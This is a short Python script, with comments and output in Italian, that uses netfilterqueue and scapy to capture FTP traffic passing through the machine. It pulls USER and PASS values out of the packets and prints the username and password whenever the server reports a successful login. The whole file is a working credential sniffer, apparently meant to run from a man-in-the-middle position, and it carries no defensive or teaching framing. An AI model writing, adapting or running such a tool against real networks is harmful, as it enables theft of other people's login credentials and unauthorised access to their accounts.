import netfilterqueue
import scapy.all as scapy

logs = {}

def print_results():
    collected = []
    for key in logs.keys():
        for log in logs[key]:
            log = str(log)
            if "USER" in log or "PASS" in log:
                collected.append(log.split(" ")[1].split("'\'")[0])
            elif "230" in log:
                print("USER : " + collected[0] + " \n" + "PASS :" + collected[1] + "\n")
                collected = []
            elif "530" in log:
                collected = []
   
def analize_ftp(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.TCP):
            dport = scapy_packet[scapy.TCP].dport
            sport = scapy_packet[scapy.TCP].sport
            if scapy_packet.haslayer(scapy.Raw):
                payload = scapy_packet[scapy.Raw].load.decode(errors="ignore")
                if dport == 21:
                    ip = scapy_packet[scapy.IP].src
                    if(not (str(ip)+"-"+str(dport) in logs.keys())):
                        logs[str(ip)+"-"+str(dport)] = []
                    logs[str(ip)+"-"+str(dport)].append(payload)
                    print("Pacchetto FTP")       
                if sport == 21:
                    dstip = scapy_packet[scapy.IP].dst
                    if(not (str(dstip)+"-"+str(sport) in logs.keys())):
                        logs[str(dstip)+"-"+str(sport)] = []
                    logs[str(dstip)+"-"+str(sport)].append(payload)
                    print("Pacchetto FTP")
                print_results()
        packet.accept()
    except KeyboardInterrupt:
        print("Programma terminato")
        print_results()
    
    
try:
    packet_queue = netfilterqueue.NetfilterQueue()
    packet_queue.bind(1, analize_ftp)
    packet_queue.run()
except KeyboardInterrupt:
        print_results()